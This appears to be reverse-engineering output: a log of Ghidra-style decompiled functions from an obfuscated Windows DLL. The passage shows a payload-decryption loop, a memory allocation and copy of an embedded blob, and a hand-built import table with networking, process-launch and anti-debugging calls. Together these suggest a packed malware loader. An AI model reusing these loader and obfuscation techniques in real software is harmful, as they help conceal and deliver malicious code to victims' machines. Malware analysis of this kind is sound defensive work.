null

Logs:
# Decompiled Functions: index 700-799

Total requested: 100, succeeded: 100, failed: 0

## Function: FUN_180035700 (0x180035700)

```c

ulonglong FUN_180035700(void)

{
  LRESULT LVar1;
  longlong in_R9;
  ulonglong lParam;
  longlong in_R10;
  undefined4 local_18;
  
  lParam = (in_R9 + 0x16) * in_R10;
  LVar1 = SendMessageA((HWND)0x0,local_18,0x1800ca7a1,lParam);
  return LVar1 + 0x1eU ^ lParam;
}


```

---

## Function: FUN_180035770 (0x180035770)

```c

/* WARNING: Removing unreachable block (ram,0x000180035822) */

undefined8 FUN_180035770(void)

{
  LPCSTR lpPathName;
  CHAR local_130 [80];
  undefined8 uStack_e0;
  
  lpPathName = local_130;
  uStack_e0 = 0x1800357a5;
  RemoveDirectoryA(lpPathName);
  uStack_e0 = 0x1800357ed;
  RemoveDirectoryA(lpPathName + 10);
  uStack_e0 = 0x180035874;
  CreateToolhelp32Snapshot();
  uStack_e0 = 0x180035899;
  FUN_180014810();
  uStack_e0 = 0x1800358de;
  CloseServiceHandle((SC_HANDLE)0x0);
  return 0;
}


```

---

## Function: FUN_180035a28 (0x180035a28)

```c

void FUN_180035a28(void)

{
  FUN_1800166a8();
  FUN_180029310();
  return;
}


```

---

## Function: FUN_180035ba8 (0x180035ba8)

```c

/* WARNING: Removing unreachable block (ram,0x000180035dbb) */

void FUN_180035ba8(void)

{
  FUN_180001000();
  FUN_180053c00();
  return;
}


```

---

## Function: FUN_180035df8 (0x180035df8)

```c

undefined8 FUN_180035df8(void)

{
  ulonglong *puVar1;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  
  puVar1 = &DAT_18006056e;
  lVar2 = 0xb39c;
  do {
    uVar3 = (*puVar1 >> 0x21 | *puVar1 << 0x1f) + 0x6c07de65703ddae3;
    uVar3 = ((uVar3 >> 0x1e | uVar3 << 0x22) << 7 | (uVar3 & 0x3fffffff) >> 0x17) +
            0xef33049642393603;
    uVar3 = (uVar3 >> 0x37 | uVar3 * 0x200) + 0x10ccfb69bdc6c9fd;
    uVar3 = (uVar3 << 0x20 | uVar3 >> 0x20) + 0xef3304962dba6d49;
    uVar3 = ((uVar3 >> 0x11 | uVar3 << 0x2f) ^ 0x9c8c7a98c591fc88) + 0x637385673a6e0378;
    uVar3 = ((uVar3 >> 0x32 | uVar3 * 0x4000) << 0x2c | (uVar3 & 0x3ffffffffffff) >> 6) +
            0x50c6e70ad012e86c;
    uVar3 = (uVar3 << 0x2b | uVar3 >> 0x15) + 0xaf3918f52fed1794;
    uVar3 = (uVar3 * 0x8000000 | uVar3 >> 0x25) ^ 0x516fd7dcfc56e920;
    uVar4 = (uVar3 >> 0x19 | uVar3 << 0x27) + 0xae9028223815e7ef;
    uVar3 = uVar4 >> 0x23;
    uVar3 = (uVar3 << 0x2d | (uVar4 * 0x20000000 | uVar3) >> 0x13) + 0xae9028223815e7ef;
    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x36) + 0x45bf5f77400882fc;
    uVar4 = ((uVar3 << 0x37 | uVar3 >> 9) + 0x516fd7de703a9603 ^ 0x516fd7de703a9603) +
            0xa2dfafbce0752c06;
    uVar3 = uVar4 >> 5;
    uVar3 = (uVar3 << 0x17 | (uVar3 | uVar4 << 0x3b) >> 0x29) + 0xae9028218fc569fd ^
            0x36091bc659307389;
    uVar3 = ((uVar3 << 0x11 & 0x3fffffffff) >> 0x18 |
            ((uVar3 & 0x7fffffffffff) >> 0x15 | (uVar3 >> 0x2f | uVar3 << 0x11) << 0x1a) << 0xe) +
            0x8104070b62b45707;
    uVar4 = ((uVar3 >> 0x20 | uVar3 << 0x20) - 0xd4c5c4eb ^ 0xccf4a4abdffe6706) + 0x330b5b54200198fa
    ;
    uVar3 = uVar4 >> 0x17;
    uVar3 = ((uVar3 << 0x1a | (uVar4 << 0x29 | uVar3) >> 0x26) ^ 0x78e630510) + 0x7a525628ceb10b66;
    uVar4 = (uVar3 >> 0x36 | uVar3 * 0x400) + 0xeb98a77a4cc2d6d5;
    uVar3 = uVar4 >> 0x1b;
    uVar4 = (((uVar4 << 0x25 | uVar3) >> 0x22 | uVar3 << 0x1e) ^ 0xd87c71b7de5a753e) +
            0xd87c71b7950fc341;
    uVar3 = (uVar4 & 0x3ffffffffffffff) >> 4;
    uVar3 = ((uVar3 * 0x2000 | (uVar3 | (uVar4 >> 0x3a | uVar4 * 0x40) << 0x36) >> 0x33) << 0x22 |
            (uVar3 & 0x7ffffffffffff) >> 0x11) + 0x43f0d0761f1c6de5;
    uVar3 = (uVar3 << 0x23 | uVar3 >> 0x1d) + 0x7170e748d2a5334d;
    uVar4 = (uVar3 >> 0x19 | uVar3 << 0x27) ^ 0xd27fe92d391bb75e;
    uVar3 = uVar4 >> 0x31;
    uVar3 = (uVar3 << 0x37 | (uVar3 | uVar4 << 0xf) >> 9) ^ 0xd27fe92cde66acde;
    uVar3 = (uVar3 << 0x15 | uVar3 >> 0x2b) + 0x9fd761830a027ec3;
    uVar3 = (uVar3 >> 0x23 | uVar3 * 0x20000000) + 0x60289e7cf5fd813d;
    uVar3 = (((uVar3 * 0x8000 | uVar3 >> 0x31) << 0x13 | (uVar3 & 0x1ffffffffffff) >> 0x1e) << 0x11
            | (uVar3 * 0x8000 & 0x1fffffffffff) >> 0x1c) + 0x60289e7dd344f30c ^ 0x9fd76181f9e5ada0;
    uVar3 = ((uVar3 >> 0x1b | uVar3 << 0x25) << 0x12 | (uVar3 & 0x7ffffff) >> 9) +
            0xb0c0fcf2d6d04feb;
    uVar4 = (uVar3 >> 0x35 | uVar3 * 0x800) + 0x80810cf23a014fd9;
    uVar3 = uVar4 >> 0x28;
    uVar4 = (((uVar3 | uVar4 * 0x1000000) >> 2 | uVar3 << 0x3e) + 0x2f55dc08a25661d4 ^
            0xd0aa23f75da99e2c) + 0x8e019419e703257c;
    uVar3 = uVar4 >> 0x13;
    uVar3 = ((uVar3 << 0x2b | (uVar3 | uVar4 << 0x2d) >> 0x15) ^ 0xd0aa23f75da99e2c) +
            0xd0aa23f7232ae4c2;
    uVar3 = ((uVar3 << 0x27 | uVar3 >> 0x19) + 0xabb81136917da05f ^ 0x1c3bc2bc6) +
            0x21371347021bb382;
    uVar3 = (uVar3 * 0x80000 | uVar3 >> 0x2d) + 0x560e59aa78d37e78;
    uVar4 = (((uVar3 >> 0x31 | uVar3 * 0x8000) + 0x53e34cab0e590310 ^ 0x560e59aa78d37e78) +
             0x560e59aa78d37e78 ^ 0x560e59aa78d37e78) + 0xa9f1a655872c8188;
    uVar3 = uVar4 >> 0x38;
    uVar3 = (uVar3 << 0x3a | (uVar3 | uVar4 * 0x100) >> 6) ^ 0x560e59aa78d37e78;
    uVar4 = ((uVar3 << 0xd | uVar3 >> 0x33) << 0x16 | (uVar3 & 0x7ffffffffffff) >> 0x1d) +
            0x1cb2061ea7c69957;
    uVar3 = uVar4 >> 0x10;
    uVar3 = (uVar3 << 0x22 | (uVar4 << 0x30 | uVar3) >> 0x1e) + 0x8d37e78560e59aa7;
    uVar4 = (uVar3 << 0x2d | uVar3 >> 0x13) + 0x396adab9db66c6d1;
    uVar3 = uVar4 >> 0xc;
    lVar2 = lVar2 + -1;
    uVar4 = (uVar3 << 0x39 | (uVar4 << 0x34 | uVar3) >> 7) + 0x66b40f4fb2e0aab2;
    uVar3 = uVar4 >> 0x22;
    uVar4 = (((uVar4 * 0x40000000 | uVar3) >> 5 | uVar3 << 0x3b) ^ 0x66b40f4f9d38d966) +
            0xa443acd292cca774;
    uVar3 = uVar4 >> 0x19;
    uVar3 = ((uVar3 & 0xfffffffff8000000 | uVar4 << 0x27 | uVar3 & 0x7ffffff) ^ 0xd60288c4689946d9)
            + 0x29fd773b9766b927;
    uVar3 = ((uVar3 >> 9 | uVar3 << 0x37) ^ 0xd60288c4689946d9) + 0xc53faee727d01dee;
    uVar3 = ((((uVar3 & 0xfffff) >> 9 | (uVar3 >> 0x14) << 0xb) << 3 |
             (uVar3 << 0x2c & 0x1fffffffffffff) >> 0x32) << 0x29 |
            (uVar3 << 0x2c & 0x3ffffffffffff | uVar3 >> 0x14) >> 9) + 0x8e7580a22f69cc50 ^
            0xf79d7341fef85340;
    uVar3 = (uVar3 << 7 | uVar3 >> 0x39) + 0x76e6146225d13e5 ^ 0x76e61468c3ebc6b;
    uVar3 = (uVar3 << 0x29 | uVar3 >> 0x17) + 0xa30faf1ac1db9851;
    uVar3 = ((uVar3 >> 0x3e | uVar3 * 4) ^ 0xa30faf1ac1db9851) + 0x7401357484a4de97;
    uVar3 = (uVar3 >> 0x1d | uVar3 << 0x23) + 0x58d2e5d09b01e0b0;
    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x36) + 0xa78b16f808248c7 ^ 0xa3efa9d086de6a91;
    uVar3 = ((uVar3 << 0x30 | uVar3 >> 0x10) ^ 0xe0832d9eda1afade) + 0x36e43cd80da8d00c;
    uVar3 = ((uVar3 >> 0x12 | uVar3 << 0x2e) ^ 0x1b721e6c06d46806) + 0xe48de194ba1d7123;
    uVar3 = ((uVar3 * 0x100000 | uVar3 >> 0x2c) << 10 | (uVar3 & 0xfffffffffff) >> 0x22) ^
            0x1b721e6b45e28edd;
    uVar3 = (((uVar3 & 0x7fffffffff) >> 0x1b | (uVar3 >> 0x27 | uVar3 << 0x19) << 0xc) +
             0x476e8db90f35a2f1 ^ 0x476e8db90f35a2f1) + 0x476e8db90f35a2f1;
    uVar3 = (uVar3 << 0x30 | uVar3 >> 0x10) + 0x476e8db90f35a2f1;
    uVar3 = (uVar3 >> 0x21 | uVar3 * 0x80000000) + 0x476e8db90f35a2f1 ^ 0xf35a2f1476e8db9;
    uVar3 = (((uVar3 << 0x18 | uVar3 >> 0x28) ^ 0xf35a2f1476e8db9) + 0xca5d0eb89172470 ^
            0xf35a2f1476e8db90) + 0xca5d0eb89172470 ^ 0xf35a2f149a1dbafd;
    uVar3 = ((uVar3 >> 0xd | uVar3 << 0x33) ^ 0xdd7ef9ad178a4d0e) + 0xe6b45e29343b75fb ^
            0xe6b45e29343b75fb;
    uVar3 = (uVar3 << 0x39 | uVar3 >> 7) + 0x652e875b2f12282 ^ 0xf9ad178a4d0edd7e;
    uVar3 = ((uVar3 >> 0x21 | uVar3 << 0x1f) << 2 | (uVar3 & 0x1ffffffff) >> 0x1f) ^
            0xf9ad178a4d0edd7e;
    uVar3 = ((uVar3 << 1 | uVar3 >> 0x3f) << 2 | (uVar3 & 0x7fffffffffffffff) >> 0x3d) +
            0x44635b650d5ede70;
    uVar3 = (uVar3 << 0x35 | uVar3 >> 0xb) + 0x8be0c85c8e2b1f13;
    uVar4 = uVar3 >> 0x1e;
    uVar3 = (uVar4 | uVar3 << 0x22) >> 9;
    uVar4 = (uVar4 << 0x37 | uVar3) >> 0x35;
    uVar3 = (uVar4 << 0x38 | (uVar3 << 0xb | uVar4) >> 8) + 0x72a1d9d4f8bd2a2f;
    uVar3 = (uVar3 * 0x200000 | uVar3 >> 0x2b) ^ 0xad19ab03c0c1acb1;
    uVar3 = (uVar3 >> 0x2c | uVar3 << 0x14) + 0xad19ab03c0c1acb1;
    uVar3 = ((uVar3 >> 0x21 | uVar3 * 0x80000000) ^ 0x9fc04be6) + 0x914185282f4b7bb;
    uVar3 = ((uVar3 >> 0x26 | uVar3 * 0x4000000) + 0xe7e90306b2c62ba6 ^ 0xe7e90306b2c62ba6) +
            0x1816fcf94d39d45a;
    uVar3 = ((uVar3 * 0x2000 | uVar3 >> 0x33) + 0xcfd2060d658c574c ^ 0x5e1343c71e77a14f) +
            0x4605bf3e534e7517 ^ 0xb9fa40c1acb18ae9;
    uVar3 = ((uVar3 >> 0x34 | uVar3 << 0xc) + 0xb9fa40c1acb18ae9 ^ 0xb9fa40c1acb18ae9) +
            0x4605bf3e534e7517;
    uVar3 = ((uVar3 & 0x1ffffffffffff) >> 0xf | (uVar3 >> 0x31 | uVar3 * 0x8000) << 0x22) +
            0x9dbab407a302dfa0;
    uVar3 = ((uVar3 >> 0x27 | uVar3 * 0x2000000) << 0x17 | (uVar3 & 0x7fffffffff) >> 0x10) +
            0xf67d5e8cb2f8a470;
    uVar3 = (uVar3 * 0x80 | uVar3 >> 0x39) + 0xf67d5e8cb2f8a470;
    uVar3 = ((uVar3 << 0x33 | uVar3 >> 0xd) + 0xf67d5e8cb2f8a470 ^ 0xe41a2a13581cc48e) +
            0x1267749feae460e2;
    uVar4 = (uVar3 >> 4 | uVar3 << 0x3c) + 0x1267749f140deccd;
    uVar3 = uVar4 >> 0x29;
    *puVar1 = ((uVar3 | uVar4 * 0x800000) >> 7 | uVar3 << 0x39) + 0x667db3116c1d7e42;
    puVar1 = puVar1 + 1;
  } while (lVar2 != 0);
  return 0;
}


```

---

## Function: FUN_1800365d0 (0x1800365d0)

```c

/* WARNING: Removing unreachable block (ram,0x00018003660e) */

void FUN_1800365d0(void)

{
  FUN_180053cb8();
  return;
}


```

---

## Function: FUN_180036688 (0x180036688)

```c

/* WARNING: Removing unreachable block (ram,0x000180036799) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_180036688(void)

{
  return;
}


```

---

## Function: FUN_1800367c8 (0x1800367c8)

```c

ulonglong FUN_1800367c8(void)

{
  longlong lVar1;
  longlong in_R10;
  undefined8 local_28;
  
  lVar1 = FUN_1800495c0();
  if (lVar1 == 0) {
    lVar1 = local_28 + 0x14;
  }
  return (ulonglong)(lVar1 - in_R10) >> 9;
}


```

---

## Function: FUN_180036860 (0x180036860)

```c

undefined8 FUN_180036860(void)

{
  FUN_18004f5e8();
  return 0xd18efde75989a53d;
}


```

---

## Function: FUN_180036940 (0x180036940)

```c

void FUN_180036940(void)

{
  DAT_1800bb18d = VirtualAlloc((LPVOID)0x0,0x59ce0,0x3000,4);
  memcpy(DAT_1800bb18d,&DAT_18006056e,0x59ce0);
  return;
}


```

---

## Function: FUN_180036988 (0x180036988)

```c

/* WARNING: Removing unreachable block (ram,0x000180036a2f) */

longlong FUN_180036988(undefined8 param_1,undefined8 param_2,ulonglong param_3)

{
  ulonglong uVar1;
  longlong unaff_R12;
  longlong lVar2;
  ulonglong unaff_R13;
  undefined1 local_50 [8];
  undefined1 local_48 [32];
  undefined1 local_28 [24];
  
  if ((POPCOUNT(unaff_R13 & (ulonglong)&stack0xfffffffffffffff8 & 0xff) & 1U) == 0) {
    param_3 = param_3 >> 0x18;
    unaff_R12 = (longlong)(local_50 + unaff_R12) * 0x40000000;
  }
  lVar2 = (unaff_R12 - param_3) + 9;
  uVar1 = param_3 + lVar2;
  lVar2 = ((ulonglong)local_48 ^ uVar1) + (lVar2 - (longlong)local_28);
  return -0x66e308f842747056 -
         (unaff_R13 + 0xc +
         (ulonglong)
         (SEXT816((longlong)(uVar1 * lVar2)) != SEXT816((longlong)uVar1) * SEXT816(lVar2)));
}


```

---

## Function: FUN_180036a70 (0x180036a70)

```c

void FUN_180036a70(void)

{
  longlong lVar1;
  longlong lVar2;
  ulonglong *puVar3;
  
  lVar1 = DAT_1800bb18d;
  *(code **)(DAT_1800bb18d + 0x3e160) = GetStartupInfoW_exref;
  *(code **)(lVar1 + 0x3e168) = GetModuleHandleW_exref;
  *(code **)(lVar1 + 0x3e170) = RtlUnwindEx_exref;
  *(code **)(lVar1 + 0x3e178) = RtlPcToFileHeader_exref;
  *(code **)(lVar1 + 0x3e180) = RaiseException_exref;
  *(code **)(lVar1 + 0x3e188) = InterlockedFlushSList_exref;
  *(code **)(lVar1 + 0x3e190) = SetLastError_exref;
  *(code **)(lVar1 + 0x3e198) = EncodePointer_exref;
  *(code **)(lVar1 + 0x3e1a0) = EnterCriticalSection_exref;
  *(code **)(lVar1 + 0x3e1a8) = LeaveCriticalSection_exref;
  *(code **)(lVar1 + 0x3e1b0) = DeleteCriticalSection_exref;
  *(code **)(lVar1 + 0x3e1b8) = InitializeCriticalSectionAndSpinCount_exref;
  *(code **)(lVar1 + 0x3e1c0) = TlsAlloc_exref;
  *(code **)(lVar1 + 0x3e1c8) = TlsGetValue_exref;
  *(code **)(lVar1 + 0x3e1d0) = TlsFree_exref;
  *(code **)(lVar1 + 0x3e1d8) = FreeLibrary_exref;
  *(code **)(lVar1 + 0x3e1e0) = LoadLibraryExW_exref;
  *(code **)(lVar1 + 0x3e1e8) = ExitProcess_exref;
  *(code **)(lVar1 + 0x3e1f0) = GetModuleHandleExW_exref;
  *(code **)(lVar1 + 0x3e1f8) = GetModuleFileNameW_exref;
  *(code **)(lVar1 + 0x3e200) = HeapAlloc_exref;
  *(code **)(lVar1 + 0x3e208) = HeapFree_exref;
  *(code **)(lVar1 + 0x3e210) = FlsAlloc_exref;
  *(code **)(lVar1 + 0x3e218) = FlsGetValue_exref;
  *(code **)(lVar1 + 0x3e220) = FlsSetValue_exref;
  *(code **)(lVar1 + 0x3e228) = FlsFree_exref;
  *(code **)(lVar1 + 0x3e230) = InitializeCriticalSectionEx_exref;
  *(code **)(lVar1 + 0x3e238) = CompareStringW_exref;
  *(code **)(lVar1 + 0x3e240) = LCMapStringW_exref;
  *(code **)(lVar1 + 0x3e248) = GetFileType_exref;
  *(code **)(lVar1 + 0x3e250) = HeapReAlloc_exref;
  *(code **)(lVar1 + 0x3e258) = WaitForSingleObject_exref;
  *(code **)(lVar1 + 0x3e260) = GetExitCodeProcess_exref;
  *(code **)(lVar1 + 0x3e268) = CreateProcessW_exref;
  *(code **)(lVar1 + 0x3e270) = GetFileAttributesExW_exref;
  *(code **)(lVar1 + 0x3e278) = FindClose_exref;
  *(code **)(lVar1 + 0x3e280) = FindFirstFileExW_exref;
  *(code **)(lVar1 + 0x3e288) = FindNextFileW_exref;
  *(code **)(lVar1 + 0x3e290) = IsValidCodePage_exref;
  *(code **)(lVar1 + 0x3e298) = GetACP_exref;
  *(code **)(lVar1 + 0x3e2a0) = GetOEMCP_exref;
  *(code **)(lVar1 + 0x3e2a8) = GetCPInfo_exref;
  *(code **)(lVar1 + 0x3e2b0) = GetCommandLineA_exref;
  *(code **)(lVar1 + 0x3e2b8) = GetCommandLineW_exref;
  *(code **)(lVar1 + 0x3e2c0) = MultiByteToWideChar_exref;
  *(code **)(lVar1 + 0x3e2c8) = WideCharToMultiByte_exref;
  *(code **)(lVar1 + 0x3e2d0) = GetEnvironmentStringsW_exref;
  *(code **)(lVar1 + 0x3e2d8) = FreeEnvironmentStringsW_exref;
  *(code **)(lVar1 + 0x3e2e0) = SetEnvironmentVariableW_exref;
  *(code **)(lVar1 + 0x3e2e8) = GetProcessHeap_exref;
  *(code **)(lVar1 + 0x3e000) = GetTokenInformation_exref;
  *(code **)(lVar1 + 0x3e008) = OpenProcessToken_exref;
  *(code **)(lVar1 + 0x3e2f8) = ShellExecuteExA_exref;
  *(code **)(lVar1 + 0x3e308) = htons_exref;
  *(code **)(lVar1 + 0x3e310) = recv_exref;
  *(code **)(lVar1 + 0x3e318) = connect_exref;
  *(code **)(lVar1 + 0x3e320) = WSACleanup_exref;
  *(code **)(lVar1 + 0x3e328) = closesocket_exref;
  *(code **)(lVar1 + 0x3e330) = inet_pton_exref;
  *(code **)(lVar1 + 0x3e338) = WSAStartup_exref;
  *(code **)(lVar1 + 0x3e340) = send_exref;
  *(code **)(lVar1 + 0x3e348) = socket_exref;
  *(code **)(lVar1 + 0x3e350) = WSAGetLastError_exref;
  *(code **)(lVar1 + 0x3e360) = BCryptGenRandom_exref;
  *(code **)(lVar1 + 0x3e018) = SetEndOfFile_exref;
  *(code **)(lVar1 + 0x3e020) = ReadConsoleW_exref;
  *(code **)(lVar1 + 0x3e028) = ReadFile_exref;
  *(code **)(lVar1 + 0x3e030) = HeapSize_exref;
  *(code **)(lVar1 + 0x3e038) = CreateFileW_exref;
  *(code **)(lVar1 + 0x3e040) = GetStringTypeW_exref;
  *(code **)(lVar1 + 0x3e048) = SetFilePointerEx_exref;
  *(code **)(lVar1 + 0x3e050) = GetFileSizeEx_exref;
  *(code **)(lVar1 + 0x3e058) = SetStdHandle_exref;
  *(code **)(lVar1 + 0x3e060) = GetConsoleMode_exref;
  *(code **)(lVar1 + 0x3e068) = GetModuleFileNameA_exref;
  *(code **)(lVar1 + 0x3e070) = VirtualProtect_exref;
  *(code **)(lVar1 + 0x3e078) = SetConsoleTextAttribute_exref;
  *(code **)(lVar1 + 0x3e080) = WriteConsoleW_exref;
  *(code **)(lVar1 + 0x3e088) = GetCurrentProcess_exref;
  *(code **)(lVar1 + 0x3e090) = GetStdHandle_exref;
  *(code **)(lVar1 + 0x3e098) = VirtualAlloc_exref;
  *(code **)(lVar1 + 0x3e0a0) = GetModuleHandleA_exref;
  *(code **)(lVar1 + 0x3e0a8) = Sleep_exref;
  *(code **)(lVar1 + 0x3e0b0) = GetLastError_exref;
  *(code **)(lVar1 + 0x3e0b8) = LoadLibraryA_exref;
  *(code **)(lVar1 + 0x3e0c0) = CloseHandle_exref;
  *(code **)(lVar1 + 0x3e0c8) = GetProcAddress_exref;
  *(code **)(lVar1 + 0x3e0d0) = GetCurrentProcessId_exref;
  *(code **)(lVar1 + 0x3e0d8) = GetTickCount_exref;
  *(code **)(lVar1 + 0x3e0e0) = AllocConsole_exref;
  *(code **)(lVar1 + 0x3e0e8) = GetConsoleOutputCP_exref;
  *(code **)(lVar1 + 0x3e0f0) = VirtualFree_exref;
  *(code **)(lVar1 + 0x3e0f8) = TlsSetValue_exref;
  *(code **)(lVar1 + 0x3e100) = WriteFile_exref;
  *(code **)(lVar1 + 0x3e108) = FlushFileBuffers_exref;
  *(code **)(lVar1 + 0x3e110) = RtlCaptureContext_exref;
  *(code **)(lVar1 + 0x3e118) = RtlLookupFunctionEntry_exref;
  *(code **)(lVar1 + 0x3e120) = RtlVirtualUnwind_exref;
  *(code **)(lVar1 + 0x3e128) = UnhandledExceptionFilter_exref;
  *(code **)(lVar1 + 0x3e130) = SetUnhandledExceptionFilter_exref;
  *(code **)(lVar1 + 0x3e138) = TerminateProcess_exref;
  *(code **)(lVar1 + 0x3e140) = IsProcessorFeaturePresent_exref;
  *(code **)(lVar1 + 0x3e148) = GetSystemTimeAsFileTime_exref;
  *(code **)(lVar1 + 0x3e150) = InitializeSListHead_exref;
  *(code **)(lVar1 + 0x3e158) = IsDebuggerPresent_exref;
  lVar2 = 0x3d1;
  puVar3 = &DAT_1800bb4bd;
  do {
    *(ulonglong *)((*puVar3 ^ 0x9eb4a83cf248457c) + lVar1) =
         (puVar3[1] ^ 0x9eb4a83cf248457c) + lVar1;
    puVar3 = puVar3 + 2;
    lVar2 = lVar2 + -1;
  } while (lVar2 != 0);
  DAT_1800bb185 = lVar1 + 0x3470;
  return;
}


```

---

## Function: FUN_180037088 (0x180037088)

```c

void FUN_180037088(void)

{
  FUN_180052e18();
  return;
}


```

---

## Function: FUN_180037128 (0x180037128)

```c

ulonglong FUN_180037128(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong in_R11;
  ulonglong uVar3;
  
  uVar3 = in_R11 & in_RAX;
  uVar2 = in_RAX ^ 0x60e99865e87ce966;
  uVar1 = FUN_180025350();
  return (uVar1 | uVar3) & uVar2;
}


```

---

## Function: FUN_1800371c8 (0x1800371c8)

```c

ulonglong FUN_1800371c8(void)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  undefined1 local_38 [32];
  
  puVar2 = local_38;
  uVar1 = FUN_18001a6b8();
  if (uVar1 == 0) {
    uVar1 = (ulonglong)puVar2 ^ 0xe;
  }
  return uVar1;
}


```

---

## Function: FUN_180037278 (0x180037278)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180037278(void)

{
  int iVar1;
  BOOL BVar2;
  ulonglong uVar3;
  undefined4 extraout_var;
  SIZE_T SVar4;
  undefined4 extraout_var_00;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  longlong lVar8;
  undefined *puVar9;
  ulonglong unaff_RBX;
  undefined1 *puVar10;
  ulonglong unaff_RSI;
  ulonglong uVar11;
  ulonglong unaff_RDI;
  longlong in_R9;
  longlong *plVar12;
  ulonglong in_R10;
  longlong unaff_R12;
  ulonglong uVar13;
  undefined1 *puVar14;
  ulonglong uVar15;
  longlong local_60;
  undefined1 local_58 [8];
  longlong local_50 [2];
  undefined8 local_40;
  undefined8 local_38;
  undefined1 local_30 [8];
  
  uVar11 = unaff_RSI ^ in_R9 + unaff_R12;
  uVar6 = 0xaf26754178966993;
  plVar12 = local_50;
  FUN_18001b528();
  uVar15 = unaff_R12 + 0x39 + (ulonglong)(uVar6 < 7);
  uVar7 = 0x32caba465e753a35;
  uVar3 = FUN_1800419c0(0x32caba465e753a35);
  uVar6 = 0;
  puVar14 = local_30 + unaff_R12 + -6;
  if (uVar3 != 0) {
    uVar13 = (ulonglong)(local_30 + unaff_R12 + -6) & in_R10;
    unaff_RBX = unaff_RBX | uVar13;
    uVar6 = uVar3 | uVar7;
    uVar15 = uVar15 & uVar13 ^ in_R10 ^ (ulonglong)plVar12;
    uVar11 = uVar11 | unaff_RBX;
    puVar14 = local_38;
  }
  if (unaff_RBX == 0) {
    uVar6 = uVar6 >> 0xb;
    plVar12 = (longlong *)((ulonglong)plVar12 >> 3);
    unaff_RDI = unaff_RDI + 0x13;
  }
  puVar10 = (undefined1 *)(unaff_RBX + uVar6);
  uVar6 = 0;
  lVar8 = -0x2208f44c87aa2102;
  iVar1 = GetWindowTextA((HWND)0x0,(LPSTR)0xddf70bb37855defe,-0x7ff40412);
  if (CONCAT44(extraout_var,iVar1) != 0) {
    puVar10 = local_30;
    unaff_RDI = unaff_RDI + lVar8;
    uVar11 = (uVar11 - (longlong)plVar12) * 0x4000000 ^ uVar6 ^ uVar15;
    puVar14 = puVar14 + (5 - lVar8);
  }
  uVar6 = (ulonglong)plVar12 >> 7;
  uVar15 = uVar15 + 7;
  puVar9 = &DAT_1800ca8d1;
  lVar8 = -0x398c1331e7ebe45e;
  SVar4 = VirtualQuery((LPCVOID)0xc673ecce18141ba2,(PMEMORY_BASIC_INFORMATION)&DAT_1800ca8d1,
                       (SIZE_T)local_58);
  if (SVar4 == 0) {
    lVar8 = lVar8 - uVar6;
    uVar15 = (uVar15 ^ unaff_RDI) + 10;
    unaff_RDI = unaff_RDI + 3;
    puVar14 = puVar14 + (longlong)puVar9 + 3;
  }
  uVar3 = (longlong)&local_40 + 4;
  puVar10 = (undefined1 *)(((longlong)puVar10 >> 1) + 0x11 + lVar8);
  uVar6 = (longlong)local_50 + uVar15;
  if ((longlong)unaff_RDI < 0) {
    puVar10 = local_58;
  }
  uVar7 = 0;
  plVar12 = &local_60;
  BVar2 = RemoveDirectoryA((LPCSTR)0x0);
  if (CONCAT44(extraout_var_00,BVar2) == 0) {
    uVar3 = uVar3 + uVar15;
    puVar14 = puVar14 + -5;
    plVar12 = (longlong *)((longlong)plVar12 + (longlong)puVar14 * 2);
    uVar7 = uVar7 >> 2;
  }
  if ((POPCOUNT((ulonglong)plVar12 & (ulonglong)puVar10 & 0xff) & 1U) == 0) {
    puVar14 = (undefined1 *)(((ulonglong)puVar14 & uVar6 | uVar7 + 0xf) - uVar11);
  }
  lVar5 = FUN_180043178();
  lVar8 = 0;
  if (lVar5 != 0) {
    uVar6 = uVar6 ^ uVar11;
    lVar8 = local_60;
  }
  uVar7 = lVar8 * (longlong)puVar14;
  lVar8 = (longlong)
          (((longlong)puVar10 - ((longlong)local_50 >> 0x14)) *
           (((longlong)local_50 >> 0x14) + (local_40 + (uVar3 >> 0x1a)) * 0x10000000) + local_50[0])
          >> 0x1d;
  if (lVar8 < 0) {
    uVar7 = (uVar7 & (ulonglong)puVar14 >> 9) - 0x19;
  }
  return uVar7 + lVar8 + uVar6;
}


```

---

## Function: FUN_1800375a8 (0x1800375a8)

```c

undefined1 * FUN_1800375a8(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  undefined1 *puVar2;
  undefined1 *puVar3;
  undefined1 local_res18 [16];
  
  puVar3 = local_res18;
  BVar1 = GetClientRect((HWND)0x5b53a8cb5b81598d,(LPRECT)0x9aed99377dccf62);
  puVar2 = (undefined1 *)CONCAT44(extraout_var,BVar1);
  if ((undefined1 *)CONCAT44(extraout_var,BVar1) == (undefined1 *)0x0) {
    puVar2 = puVar3;
  }
  return puVar2;
}


```

---

## Function: FUN_180037648 (0x180037648)

```c

void FUN_180037648(void)

{
  FUN_18002cbf0();
  return;
}


```

---

## Function: FUN_180037718 (0x180037718)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_180037718(void)

{
  int iVar1;
  undefined4 extraout_var;
  longlong lVar2;
  longlong lVar3;
  longlong unaff_RSI;
  REGSAM samDesired;
  int in_R10D;
  PHKEY in_stack_ffffffffffffff88;
  
  samDesired = 0x800cce09;
  lVar2 = 0x1800dce27;
  lVar3 = 0x45d14924b57c7d10;
  iVar1 = recv(0x1800dce27,(char *)0x45d14924b57c7d10,in_R10D,-0x7ff331f7);
  if (CONCAT44(extraout_var,iVar1) != 0) {
    lVar2 = lVar2 * 0x400000 - unaff_RSI;
    in_R10D = 0;
  }
  RegOpenKeyExW((HKEY)(lVar2 + 3),(LPCWSTR)(lVar3 + 5),in_R10D + 0x27,samDesired,
                in_stack_ffffffffffffff88);
  return;
}


```

---

## Function: FUN_1800378d0 (0x1800378d0)

```c

/* WARNING: Removing unreachable block (ram,0x0001800378fe) */

undefined8 FUN_1800378d0(void)

{
  FUN_180048338();
  return 0;
}


```

---

## Function: FUN_1800379e0 (0x1800379e0)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_1800379e0(void)

{
  longlong lVar1;
  longlong unaff_RBP;
  undefined1 *puVar2;
  ulonglong unaff_R12;
  undefined1 local_res10 [24];
